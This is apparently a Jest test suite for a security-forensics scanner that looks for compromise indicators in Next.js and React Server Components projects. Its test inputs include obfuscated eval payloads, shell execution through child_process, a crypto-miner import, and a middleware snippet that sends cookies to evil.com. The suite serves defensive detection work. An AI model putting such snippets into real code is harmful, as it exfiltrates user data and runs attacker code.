/**
 * Layer 8 Security Forensics Tests
 * Comprehensive test suite for IoC detection, baseline system, and reporters
 */

const path = require('path');
const fs = require('fs').promises;
const { execSync } = require('child_process');

const fixturesPath = path.join(__dirname, 'fixtures', 'layer-8');

describe('Layer 8 Security Forensics', () => {
  let Layer8;
  let SignatureAnalyzer;
  let constants;
  let CLIReporter;
  let JSONReporter;
  
  beforeAll(() => {
    Layer8 = require('../scripts/fix-layer-8-security');
    SignatureAnalyzer = require('../scripts/fix-layer-8-security/detectors/signature-analyzer');
    constants = require('../scripts/fix-layer-8-security/constants');
    const reporters = require('../scripts/fix-layer-8-security/reporters');
    CLIReporter = reporters.CLIReporter;
    JSONReporter = reporters.JSONReporter;
  });

  describe('IoC Signature Constants', () => {
    test('should have 70 IoC signatures defined', () => {
      expect(constants.IOC_SIGNATURES.signatures.length).toBe(70);
    });

    test('should have required fields for each signature', () => {
      constants.IOC_SIGNATURES.signatures.forEach((sig) => {
        expect(sig.id).toBeDefined();
        expect(sig.name).toBeDefined();
        expect(sig.pattern).toBeDefined();
        expect(sig.severity).toMatch(/^(critical|high|medium|low|info)$/);
        expect(sig.category).toBeDefined();
        expect(sig.description).toBeDefined();
        expect(sig.remediation).toBeDefined();
      });
    });

    test('should have critical severity for obfuscated eval patterns', () => {
      const evalSig = constants.IOC_SIGNATURES.signatures.find(s => s.id === 'NEUROLINT-IOC-001');
      expect(evalSig.severity).toBe('critical');
    });

    test('should have high severity for Function constructor', () => {
      const fnSig = constants.IOC_SIGNATURES.signatures.find(s => s.id === 'NEUROLINT-IOC-003');
      expect(fnSig.severity).toBe('high');
    });

    test('should have high severity for child process usage', () => {
      const cpSig = constants.IOC_SIGNATURES.signatures.find(s => s.id === 'NEUROLINT-IOC-005');
      expect(cpSig.severity).toBe('high');
    });

    test('should include RSC-specific patterns (15+)', () => {
      const rscPatterns = constants.IOC_SIGNATURES.signatures.filter(
        s => s.category === 'rsc-specific'
      );
      expect(rscPatterns.length).toBeGreaterThanOrEqual(15);
    });

    test('should include Next.js-specific patterns (15+)', () => {
      const nextjsPatterns = constants.IOC_SIGNATURES.signatures.filter(
        s => s.category === 'nextjs-specific'
      );
      expect(nextjsPatterns.length).toBeGreaterThanOrEqual(15);
    });

    test('should include exfiltration patterns', () => {
      const exfilPatterns = constants.IOC_SIGNATURES.signatures.filter(
        s => s.category === 'data-exfiltration'
      );
      expect(exfilPatterns.length).toBeGreaterThan(0);
    });

    test('should include persistence and backdoor patterns', () => {
      const persistPatterns = constants.IOC_SIGNATURES.signatures.filter(
        s => s.category === 'backdoor' || s.category === 'persistence'
      );
      expect(persistPatterns.length).toBeGreaterThan(0);
    });

    test('should have SEVERITY_LEVELS defined', () => {
      expect(constants.SEVERITY_LEVELS).toBeDefined();
      expect(constants.SEVERITY_LEVELS.CRITICAL).toBe('critical');
      expect(constants.SEVERITY_LEVELS.HIGH).toBe('high');
      expect(constants.SEVERITY_LEVELS.MEDIUM).toBe('medium');
      expect(constants.SEVERITY_LEVELS.LOW).toBe('low');
    });

    test('should have DETECTION_MODES defined', () => {
      expect(constants.DETECTION_MODES).toBeDefined();
      expect(constants.DETECTION_MODES.QUICK).toBeDefined();
      expect(constants.DETECTION_MODES.STANDARD).toBeDefined();
      expect(constants.DETECTION_MODES.DEEP).toBeDefined();
      expect(constants.DETECTION_MODES.PARANOID).toBeDefined();
    });
  });

  describe('Signature Analyzer', () => {
    let analyzer;
    
    beforeEach(() => {
      analyzer = new SignatureAnalyzer({ verbose: false });
    });

    test('should detect obfuscated eval with atob', () => {
      const code = 'const result = eval(atob(encodedPayload));';
      const result = analyzer.analyze(code, 'test.js');
      
      expect(result.findings.length).toBeGreaterThan(0);
      const evalFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-001');
      expect(evalFinding).toBeDefined();
      expect(evalFinding.severity).toBe('critical');
    });

    test('should detect obfuscated eval with Buffer', () => {
      const code = 'eval(Buffer.from(payload, "base64").toString());';
      const result = analyzer.analyze(code, 'test.js');
      
      const bufferFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-002');
      expect(bufferFinding).toBeDefined();
      expect(bufferFinding.severity).toBe('critical');
    });

    test('should detect Function constructor', () => {
      const code = 'const fn = new Function("return " + code);';
      const result = analyzer.analyze(code, 'test.js');
      
      const fnFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-003');
      expect(fnFinding).toBeDefined();
    });

    test('should detect child_process require', () => {
      const code = "const { exec } = require('child_process');";
      const result = analyzer.analyze(code, 'test.js');
      
      const cpFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-005');
      expect(cpFinding).toBeDefined();
    });

    test('should detect shell command execution', () => {
      const code = "exec('bash -c whoami');";
      const result = analyzer.analyze(code, 'test.js');
      
      const shellFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-006');
      expect(shellFinding).toBeDefined();
      expect(shellFinding.severity).toBe('critical');
    });

    test('should detect hexadecimal escape obfuscation (10+ sequences)', () => {
      const code = `const payload = '\\x65\\x76\\x61\\x6c\\x28\\x74\\x68\\x69\\x73\\x29\\x3b\\x72';`;
      const result = analyzer.analyze(code, 'test.js');
      
      const hexFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-012');
      expect(hexFinding).toBeDefined();
      expect(hexFinding.severity).toBe('medium');
      expect(hexFinding.category).toBe('obfuscation');
    });

    test('should detect dynamic import with variable', () => {
      const code = "const mod = await import(moduleName);";
      const result = analyzer.analyze(code, 'test.js');
      
      const dynImportFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-010');
      expect(dynImportFinding).toBeDefined();
    });

    test('should detect RSC rogue use server with dangerous import', () => {
      const code = `'use server'; import('child_process');`;
      const result = analyzer.analyze(code, 'actions.js');
      
      const rscFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-016');
      expect(rscFinding).toBeDefined();
      expect(rscFinding.category).toBe('rsc-specific');
    });

    test('should NOT flag clean code with false positives', async () => {
      const cleanCode = await fs.readFile(
        path.join(fixturesPath, 'clean-code.js'),
        'utf8'
      );
      const result = analyzer.analyze(cleanCode, 'clean-code.js');
      
      const criticalFindings = result.findings.filter(f => f.severity === 'critical');
      expect(criticalFindings.length).toBe(0);
    });

    test('should detect multiple vulnerabilities in vulnerable code', async () => {
      const vulnCode = await fs.readFile(
        path.join(fixturesPath, 'vulnerable-code.js'),
        'utf8'
      );
      const result = analyzer.analyze(vulnCode, 'vulnerable-code.js');
      
      expect(result.findings.length).toBeGreaterThan(2);
    });

    test('should provide line and column numbers', () => {
      const code = `line1
line2
eval(atob(payload));
line4`;
      const result = analyzer.analyze(code, 'test.js');
      
      const finding = result.findings[0];
      expect(finding).toBeDefined();
      expect(finding.line).toBeGreaterThan(0);
    });

    test('should have execution time tracking', () => {
      const code = 'const x = 1;';
      const result = analyzer.analyze(code, 'test.js');
      
      expect(result.executionTime).toBeDefined();
      expect(typeof result.executionTime).toBe('number');
    });

    test('should detect server action with eval (IOC-019)', () => {
      const code = `'use server'; async function action() { return eval(code); }`;
      const result = analyzer.analyze(code, 'actions.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-019');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('rsc-specific');
    });

    test('should detect server action with process spawn (IOC-020)', () => {
      const code = `'use server'; import { exec } from 'child_process'; exec('ls');`;
      const result = analyzer.analyze(code, 'actions.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-020');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('rsc-specific');
    });

    test('should detect middleware cookie exfiltration (IOC-037)', () => {
      const code = `export async function middleware(req) {
        const c = cookies();
        await fetch('https://evil.com', { body: JSON.stringify(c) });
      }`;
      const result = analyzer.analyze(code, 'middleware.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-037');
      expect(finding).toBeDefined();
      expect(finding.category).toBe('nextjs-specific');
    });

    test('should detect route handler shell execution (IOC-038)', () => {
      const code = `export async function GET(request) {
        exec('bash -c whoami');
        return Response.json({});
      }`;
      const result = analyzer.analyze(code, 'route.ts');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-038');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('nextjs-specific');
    });

    test('should detect AWS credentials in code (IOC-056)', () => {
      const code = `const awsKey = 'AKIAIOSFODNN7EXAMPLE';`;
      const result = analyzer.analyze(code, 'config.js');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-056');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('data-exfiltration');
    });

    test('should detect SSH private key in code (IOC-048)', () => {
      const code = `const key = '-----BEGIN RSA PRIVATE KEY-----';`;
      const result = analyzer.analyze(code, 'secrets.js');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-048');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('backdoor');
    });

    test('should detect crypto mining library import (IOC-068)', () => {
      const code = `const miner = require('coinhive');`;
      const result = analyzer.analyze(code, 'worker.js');
      
      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-068');
      expect(finding).toBeDefined();
      expect(finding.severity).toBe('critical');
      expect(finding.category).toBe('crypto-mining');
    });
  });

  describe('Layer 8 Interface', () => {
    test('should expose analyze method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.analyze).toBe('function');
    });

    test('should expose transform method (read-only by default)', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.transform).toBe('function');
    });

    test('should expose scanCompromise method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.scanCompromise).toBe('function');
    });

    test('should expose createBaseline method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.createBaseline).toBe('function');
    });

    test('should expose compareBaseline method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.compareBaseline).toBe('function');
    });

    test('should expose printReport method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.printReport).toBe('function');
    });

    test('should expose generateJSONReport method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.generateJSONReport).toBe('function');
    });

    test('should scan fixtures directory and return results', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      const result = await layer8.scanCompromise(fixturesPath);
      
      expect(result.findings).toBeDefined();
      expect(Array.isArray(result.findings)).toBe(true);
    });

    test('should respect mode settings', async () => {
      const quickLayer = new Layer8({ mode: 'quick' });
      const standardLayer = new Layer8({ mode: 'standard' });
      
      const quickResult = await quickLayer.scanCompromise(fixturesPath);
      const standardResult = await standardLayer.scanCompromise(fixturesPath);
      
      expect(quickResult.mode).toBe('quick');
      expect(standardResult.mode).toBe('standard');
    });

    test('should handle empty directories gracefully', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      const emptyDir = path.join(__dirname, '.empty-test-dir');
      
      try {
        await fs.mkdir(emptyDir, { recursive: true });
        const result = await layer8.scanCompromise(emptyDir);
        
        expect(result.findings).toBeDefined();
        expect(result.findings.length).toBe(0);
      } finally {
        try { await fs.rmdir(emptyDir); } catch (e) {}
      }
    });
  });

  describe('Baseline System', () => {
    const testBaselinePath = path.join(__dirname, '.test-baseline.json');
    
    afterEach(async () => {
      try {
        await fs.unlink(testBaselinePath);
      } catch (e) {}
    });

    test('should create baseline with file hashes', async () => {
      const layer8 = new Layer8();
      const result = await layer8.createBaseline(fixturesPath, {
        output: testBaselinePath
      });
      
      expect(result.success).toBe(true);
      expect(result.fileCount).toBeGreaterThan(0);
      expect(result.baselinePath).toBe(testBaselinePath);
      
      const baseline = JSON.parse(await fs.readFile(testBaselinePath, 'utf8'));
      expect(baseline.version).toBeDefined();
      expect(baseline.created).toBeDefined();
      expect(baseline.files).toBeDefined();
      expect(Object.keys(baseline.files).length).toBeGreaterThan(0);
    });

    test('should detect unchanged files in comparison', async () => {
      const layer8 = new Layer8();
      
      await layer8.createBaseline(fixturesPath, { output: testBaselinePath });
      
      const comparison = await layer8.compareBaseline(fixturesPath, testBaselinePath);
      
      expect(comparison.comparison.hasChanges).toBe(false);
      expect(comparison.summary.unchanged).toBeGreaterThan(0);
      expect(comparison.summary.modified).toBe(0);
    });

    test('should include SHA256 file hashes in baseline', async () => {
      const layer8 = new Layer8();
      await layer8.createBaseline(fixturesPath, { output: testBaselinePath });
      
      const baseline = JSON.parse(await fs.readFile(testBaselinePath, 'utf8'));
      
      const fileEntries = Object.entries(baseline.files);
      expect(fileEntries.length).toBeGreaterThan(0);
      
      const [fileName, fileHash] = fileEntries[0];
      expect(typeof fileName).toBe('string');
      expect(typeof fileHash).toBe('string');
      expect(fileHash.length).toBe(64);
    });

    test('should include baseline date in comparison', async () => {
      const layer8 = new Layer8();
      await layer8.createBaseline(fixturesPath, { output: testBaselinePath });
      
      const comparison = await layer8.compareBaseline(fixturesPath, testBaselinePath);
      
      expect(comparison.baselineDate).toBeDefined();
    });
  });

  describe('CLI Reporter', () => {
    test('should generate report from scan result', () => {
      const reporter = new CLIReporter();
      const scanResult = {
        findings: [
          {
            signatureId: 'NEUROLINT-IOC-001',
            signatureName: 'Eval Usage',
            severity: 'critical',
            file: 'test.js',
            line: 10,
            column: 5,
            matchedText: 'eval(atob(x))',
            description: 'Dangerous eval usage',
            remediation: 'Remove eval',
            confidence: 0.95
          }
        ],
        stats: {
          filesScanned: 100,
          filesSkipped: 5
        }
      };
      
      const output = reporter.generateReport(scanResult);
      
      expect(output).toContain('Eval Usage');
      expect(output).toContain('SCAN SUMMARY');
    });

    test('should generate summary section', () => {
      const reporter = new CLIReporter();
      const scanResult = {
        findings: [
          { id: 'TEST-001', severity: 'critical', name: 'Test' },
          { id: 'TEST-002', severity: 'high', name: 'Test' }
        ],
        stats: { filesScanned: 100, filesSkipped: 0 }
      };
      
      const output = reporter.generateReport(scanResult);
      
      expect(output).toContain('SCAN SUMMARY');
    });

    test('should show clean status when no findings', () => {
      const reporter = new CLIReporter();
      const scanResult = {
        findings: [],
        stats: { filesScanned: 50, filesSkipped: 0 }
      };
      
      const output = reporter.generateReport(scanResult);
      
      expect(output).toContain('CLEAN');
    });
  });

  describe('JSON Reporter', () => {
    test('should generate valid JSON output', () => {
      const reporter = new JSONReporter();
      const scanResult = {
        findings: [
          {
            id: 'NEUROLINT-IOC-001',
            name: 'Eval Usage',
            severity: 'critical',
            file: 'test.js',
            line: 10
          }
        ],
        stats: { filesScanned: 10, filesSkipped: 0 }
      };
      
      const output = reporter.generateReport(scanResult, { targetPath: '/test' });
      const parsed = JSON.parse(output);
      
      expect(parsed.findings).toBeDefined();
      expect(parsed.findings.length).toBe(1);
      expect(parsed.summary).toBeDefined();
    });

    test('should include metadata in JSON output', () => {
      const reporter = new JSONReporter();
      const scanResult = {
        findings: [],
        stats: { filesScanned: 10, filesSkipped: 0 }
      };
      
      const output = reporter.generateReport(scanResult, { 
        targetPath: '/test',
        mode: 'standard'
      });
      const parsed = JSON.parse(output);
      
      expect(parsed.metadata).toBeDefined();
      expect(parsed.timestamp).toBeDefined();
    });

    test('should be machine-parseable and filterable', () => {
      const reporter = new JSONReporter();
      const scanResult = {
        findings: [
          { id: 'TEST-001', severity: 'high', file: 'a.js', name: 'Test1' },
          { id: 'TEST-002', severity: 'critical', file: 'b.js', name: 'Test2' }
        ],
        stats: { filesScanned: 10, filesSkipped: 0 }
      };
      
      const output = reporter.generateReport(scanResult, {});
      
      expect(() => JSON.parse(output)).not.toThrow();
      
      const parsed = JSON.parse(output);
      const criticalFindings = parsed.findings.filter(f => f.severity === 'critical');
      expect(criticalFindings.length).toBe(1);
    });

    test('should include schema reference', () => {
      const reporter = new JSONReporter();
      const scanResult = { findings: [], stats: {} };
      
      const output = reporter.generateReport(scanResult, {});
      const parsed = JSON.parse(output);
      
      expect(parsed.$schema).toBeDefined();
    });
  });

  describe('CLI Integration', () => {
    test('should run security:scan-compromise command', () => {
      const output = execSync(
        `node cli.js security:scan-compromise ${fixturesPath} --quick 2>&1`,
        { encoding: 'utf8', timeout: 30000 }
      );
      
      expect(output).toContain('Security Forensics');
      expect(output).toContain('SCAN SUMMARY');
    });

    test('should support --json output flag', () => {
      const output = execSync(
        `node cli.js security:scan-compromise ${fixturesPath} --quick --json 2>&1`,
        { encoding: 'utf8', timeout: 30000 }
      );
      
      const jsonMatch = output.match(/\{[\s\S]*\}/);
      expect(jsonMatch).toBeTruthy();
      expect(() => JSON.parse(jsonMatch[0])).not.toThrow();
    });

    test('should show help for security commands', () => {
      const output = execSync('node cli.js help 2>&1', { encoding: 'utf8' });
      
      expect(output).toContain('security:scan-compromise');
      expect(output).toContain('security:create-baseline');
      expect(output).toContain('security:compare-baseline');
    });

    test('should accept --verbose flag', () => {
      const output = execSync(
        `node cli.js security:scan-compromise ${fixturesPath} --quick --verbose 2>&1`,
        { encoding: 'utf8', timeout: 30000 }
      );
      
      expect(output).toContain('Security Forensics');
    });

    test('should create and compare baseline via CLI', () => {
      const baselineDir = path.join(__dirname, '.cli-baseline-test');
      const baselineFile = path.join(baselineDir, 'test-baseline.json');
      
      try {
        require('fs').mkdirSync(baselineDir, { recursive: true });
        
        const createOutput = execSync(
          `node cli.js security:create-baseline ${fixturesPath} --output=${baselineFile} 2>&1`,
          { encoding: 'utf8', timeout: 30000 }
        );
        
        expect(createOutput).toContain('baseline created');
        expect(require('fs').existsSync(baselineFile)).toBe(true);
        
      } finally {
        try {
          require('fs').rmSync(baselineDir, { recursive: true, force: true });
        } catch (e) {}
      }
    });
  });

  describe('Scan Modes', () => {
    test('quick mode should complete in reasonable time', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      
      const start = Date.now();
      await layer8.scanCompromise(fixturesPath);
      const quickTime = Date.now() - start;
      
      expect(quickTime).toBeLessThan(5000);
    });

    test('paranoid mode should potentially find more patterns', async () => {
      const standardLayer = new Layer8({ mode: 'standard' });
      const paranoidLayer = new Layer8({ mode: 'paranoid' });
      
      const standardResult = await standardLayer.scanCompromise(fixturesPath);
      const paranoidResult = await paranoidLayer.scanCompromise(fixturesPath);
      
      expect(paranoidResult.findings.length).toBeGreaterThanOrEqual(
        standardResult.findings.length
      );
    });

    test('all modes should be valid', () => {
      const modes = ['quick', 'standard', 'deep', 'paranoid'];
      
      modes.forEach(mode => {
        expect(() => new Layer8({ mode })).not.toThrow();
      });
    });
  });

  describe('Error Handling', () => {
    test('should handle non-existent path gracefully', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      const result = await layer8.scanCompromise('/non/existent/path/12345');
      
      expect(result.findings).toBeDefined();
      expect(result.findings.length).toBe(0);
    });

    test('should handle binary files without crashing', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      const result = await layer8.scanCompromise(fixturesPath);
      
      expect(result).toBeDefined();
      expect(result.findings).toBeDefined();
    });

    test('should handle malformed baseline file', async () => {
      const layer8 = new Layer8();
      const badBaselinePath = path.join(__dirname, '.bad-baseline.json');
      
      try {
        await fs.writeFile(badBaselinePath, 'not valid json');
        
        await expect(
          layer8.compareBaseline(fixturesPath, badBaselinePath)
        ).rejects.toThrow();
      } finally {
        try { await fs.unlink(badBaselinePath); } catch (e) {}
      }
    });
  });
});
